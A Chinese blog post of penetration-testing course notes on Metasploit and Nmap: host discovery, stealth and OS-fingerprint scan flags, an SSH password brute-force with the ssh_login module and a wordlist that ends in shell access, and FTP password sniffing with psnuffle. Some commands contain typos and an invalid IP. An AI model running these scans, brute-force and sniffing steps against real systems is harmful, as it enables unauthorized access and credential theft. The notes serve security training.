---
title: Metasploit-2 Nmap扫描原理及口令猜测与嗅探
date: 2019-04-20 16:17:35
categories: Metasploit魔鬼训练营笔记
---
一、.主机探测与端口扫描
活跃主机扫描，指已连接到网络上、处于运行状态且网络功能正常的主机。
1.ICMP ping -c 次数 目的ip地址
2.metasploit的主机发现模块
（1）arp_sweep //地址解析协议定义，ip地址转化为MAC地址，进行广播
udp_sweep
ARP扫描器
use auxiliary/scanner/discovery/arp_sweep ; show options ; set RHOSTS 10.10.10.0/24 ; set THTEADS 50 ; set INTERFACE 网卡名称 ; run
(2)Nmap进行主机探测
nmap -sP ip地址 //同通过发送ICMP echo请求探测主机是否存活原理通ping
-sT TCP connect 扫描，类似Metasploit中的tcp扫描模块
-sS TCP SYN扫描 类似Metasploit中的syn扫描模块
-sF/-sX/-sN 这些扫描通过发送一些特殊标志位以避开设备或软件的检测
-sU 探测目标主机开放了哪些UDP端口
-Pn 在扫描之前，不发送ICMP echo 请求测试目标是否活跃
-O 启用对于TCP/IP协议栈的指纹特征获取远程主机的操作系统类型等信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190308141607641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjE1MTcwOQ==,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190308141620431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjE1MTcwOQ==,size_16,color_FFFFFF,t_70)
更加详细见nmap探测原理.pdf

二、口令猜测与嗅探
1.攻击SSH服务
需要好的用户名和口令字典
（1）use auxiliary/scanner/ssh/ssh_login ; set RHOSTS 10.10.10.2544 ; set USERNAME root ;set PASS_FILE /root/words.txt ; set THREADS 50 ; run 
（2）session -l查看获得权限的主机名称 ； seeion -i 编号 取得shell
2.psnuffle口令嗅探
获取FTP明文登陆口令
use auxiliary/sniffer/psnuffle ; run

